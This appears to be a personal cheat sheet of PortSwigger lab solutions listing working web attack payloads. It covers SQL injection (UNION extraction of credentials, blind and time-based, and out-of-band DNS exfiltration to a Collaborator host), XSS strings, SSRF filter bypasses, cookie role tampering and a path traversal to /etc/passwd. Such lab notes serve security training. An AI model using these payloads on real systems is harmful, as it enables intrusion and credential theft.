# PortSwigger Lab Solutions - Verified Techniques

## SQL Injection (14 labs solved)

### UNION-Based
- `' UNION SELECT NULL,NULL,NULL--` (determine column count)
- `' UNION SELECT NULL,'text',NULL--` (find text column)
- `' UNION SELECT username,password FROM users--` (extract data)
- `' UNION SELECT NULL,username||':'||password FROM users--` (single column concat)
- `' UNION SELECT @@version,NULL--` (MySQL version)
- `' UNION SELECT BANNER,NULL FROM v$version--` (Oracle version)

### Blind - Conditional
- `' AND SUBSTRING(password,1,1)='a'--` (character by character)
- `' AND (SELECT CASE WHEN cond THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--` (Oracle error-based)

### Blind - Time-Based
- `' || pg_sleep(10)--` (PostgreSQL)
- `' || (SELECT CASE WHEN cond THEN pg_sleep(5) ELSE pg_sleep(0) END)--` (conditional time)

### Blind - OOB
- `' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS('BURP_COLLAB') FROM dual--` (Oracle DNS)
- `'; exec master..xp_dirtree '\\'+(SELECT password)+'.COLLAB\a'--` (MSSQL DNS exfil)

## XSS (3 labs solved)

### Reflected XSS in JS String
- Payload: `'-alert(1)-'`
- Key: `'` NOT encoded in `<script>` context

### Stored XSS in href Attribute
- Payload: `javascript:alert(1)`
- Key: double-quote encoding doesn't block javascript: protocol

### DOM XSS via jQuery hashchange
- Payload: `#<img src=x onerror=print()>`
- Delivery: `iframe.src = sameURL + '#hash'` triggers hashchange

## SSRF (1 lab solved)

### Blacklist Bypass
- Host: `127.1` bypasses `localhost`/`127.0.0.1`
- Path: `%2561dmin` double URL encoding bypasses `/admin`

## Access Control (1 lab solved)

### Cookie-Based Role Tampering
- `Cookie: Admin=false` → `Cookie: Admin=true`

## Information Disclosure (1 lab solved)

### Error Message Leaking
- `GET /product?productId=abc` → Java stack trace with framework version

## Path Traversal (1 lab solved)

### Simple Traversal
- `../../../etc/passwd` (no filter bypass needed)
